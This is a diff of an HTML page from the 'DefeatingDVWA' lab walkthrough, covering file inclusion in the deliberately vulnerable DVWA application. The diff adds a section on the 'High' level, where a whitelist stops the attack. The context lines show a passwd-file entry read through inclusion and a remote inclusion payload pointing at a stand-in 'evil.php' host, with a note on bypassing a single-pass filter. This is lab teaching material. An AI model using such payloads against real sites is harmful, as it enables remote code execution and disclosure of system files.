@@ -42,7 +42,7 @@
 
 
         
-    <div class="book" data-github="jsrn/DefeatingDVWA" data-level="4" data-basepath=".." data-revision="1399203863152">
+    <div class="book" data-github="jsrn/DefeatingDVWA" data-level="4" data-basepath=".." data-revision="1399204012741">
     <div class="book-header">
     <!-- Actions Left -->
     
@@ -263,6 +263,16 @@ jsrn:x:1000:1000:jsrn,,,:/home/jsrn:/bin/zsh
 </code></pre><p>still works! The str_replace only does one pass, so once the first is removed, the result is still:</p>
 <pre><code>?page=http://www.example.com/evil.php
 </code></pre><p>Muahaha.</p>
+<h2 id="high">High</h2>
+<pre><code class="lang-php"><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'page'</span>]; <span class="hljs-comment">//The page we wish to display </span>
+
+<span class="hljs-comment">// Only allow include.php</span>
+<span class="hljs-keyword">if</span> ( <span class="hljs-variable">$file</span> != <span class="hljs-string">"include.php"</span> ) {
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">"ERROR: File not found!"</span>;
+    <span class="hljs-keyword">exit</span>;
+}
+</code></pre>
+<p>Finally, they&#39;re using a whitelist. A very short whitelist. That brings our file inclusion hijinks to an end.</p>
 
                     
                     </section>
